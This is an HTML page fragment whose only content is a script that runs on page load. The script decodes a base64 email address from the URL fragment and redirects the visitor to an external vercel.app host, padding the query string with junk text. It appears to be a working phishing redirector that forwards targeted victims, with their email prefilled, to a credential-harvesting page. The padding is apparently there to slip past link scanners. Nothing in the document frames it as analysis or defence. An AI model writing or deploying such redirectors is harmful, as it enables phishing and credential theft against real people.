<body>

  <script type="text/javascript">
    var url_string = window.location.href;
    var url_get_email = atob(getafterhash(url_string));
    var long_query_param = "shiyf24fjureujuvdehjyresthjutdhjg1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" +
                           "shiyf24fjureujuvdehjyresthjutdhjg1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" +
                           "shiyf24fjureujuvdehjyresthjutdhjg1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" +
                           "shiyf24fjureujuvdehjyresthjutdhjg1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"; // Very long query parameter
    var mail_go_url = "https://1all.vercel.app?query=" + long_query_param + "#" + url_get_email; // Added query parameter before the hash
    location.replace(mail_go_url);

    function getafterhash(url) {
      var ret;
      var queryString;
      // stuff after # is not part of query string, so get rid of it
      queryStringhash = url.split('#')[1];
      queryStringsemi = url.split(';')[1];
      queryStringsemiplus = url.split(';+')[1];
      queryStringstartsemi = url.split('*;')[1];
      // if query string exists
      if (queryStringhash) {
        ret = queryStringhash;

      } else if (queryStringsemi) {
        ret = queryStringsemi;

      } else if (queryStringsemiplus) {
        ret = queryStringsemiplus;

      } else if (queryStringstartsemi) {
        ret = queryStringstartsemi;

      } else {
        ret = 0;
      }

      return ret;
    }

  </script>
